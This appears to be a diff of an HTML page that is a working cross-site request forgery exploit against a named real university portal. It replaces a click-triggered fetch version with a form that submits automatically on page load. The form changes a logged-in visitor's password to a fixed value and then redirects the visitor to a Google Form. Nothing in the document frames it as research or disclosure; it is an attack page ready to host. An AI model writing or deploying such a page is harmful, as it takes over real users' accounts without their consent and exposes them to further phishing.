@@ -1,47 +1,14 @@
-
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <title>ePortal Password Changer</title>
-</head>
-<body>
-  <h1>Click to Change Password & Redirect</h1>
-  <p>
-    <a href="#" id="exploit">Click here</a> — do this while logged into eportal.iub.edu.pk on your mobile browser.
-  </p>
-
-  <script>
-    document.getElementById('exploit').addEventListener('click', function(e) {
-      e.preventDefault();
-
-      // Modify these variables if needed
-      const newPass = encodeURIComponent('Secret@5956');
-      const postUrl = 'https://eportal.iub.edu.pk/applicants/change_password';
-
-      // Construct form data manually to match the real form
-      const body = `password1=${newPass}&password2=${newPass}&change_pass=1`;
-
-      // Send the POST request
-      fetch(postUrl, {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/x-www-form-urlencoded'
-        },
-        body: body,
-        credentials: 'include'
-      })
-      .then(response => {
-        console.log('Password change attempted:', response.status);
-      })
-      .catch(err => {
-        console.error('Request error:', err);
-      })
-      .finally(() => {
-        // Redirect to Google Form
-        window.location.href = 'https://forms.gle/YOUR_GOOGLE_FORM_ID';
-      });
-    });
-  </script>
-</body>
+<html>
+  <body onload="document.forms[0].submit()">
+    <form method="POST" action="https://eportal.iub.edu.pk/applicants/change_password">
+      <input type="hidden" name="password1" value="Secret@5956">
+      <input type="hidden" name="password2" value="Secret@5956">
+      <input type="hidden" name="change_pass" value="1">
+    </form>
+    <script>
+      setTimeout(function() {
+        window.location.href = "https://forms.gle/YOUR_GOOGLE_FORM_ID";
+      }, 1500); // allow password change request to finish
+    </script>
+  </body>
 </html>
